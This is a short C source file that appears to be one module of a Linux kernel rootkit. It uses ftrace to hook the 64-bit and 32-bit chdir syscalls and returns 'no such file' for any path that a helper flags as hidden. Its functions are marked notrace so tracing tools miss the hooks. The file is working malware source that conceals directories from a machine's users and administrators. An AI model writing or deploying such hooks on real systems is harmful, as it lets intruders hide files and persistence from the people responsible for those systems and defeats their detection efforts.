#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hiding_stat.h"

static asmlinkage long (*orig_chdir)(const struct pt_regs *);
static asmlinkage long (*orig_chdir32)(const struct pt_regs *);

static notrace asmlinkage long hook_chdir(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->di;

    if (should_hide_path(pathname)) {
        return -ENOENT;
    }
    return orig_chdir(regs);
}

static notrace asmlinkage long hook_chdir32(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->bx;

    if (should_hide_path(pathname)) {
        return -ENOENT;
    }
    return orig_chdir32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_chdir", hook_chdir, &orig_chdir),
    HOOK("__ia32_sys_chdir", hook_chdir32, &orig_chdir32),
};

notrace int hiding_chdir_init(void) {
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_chdir_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
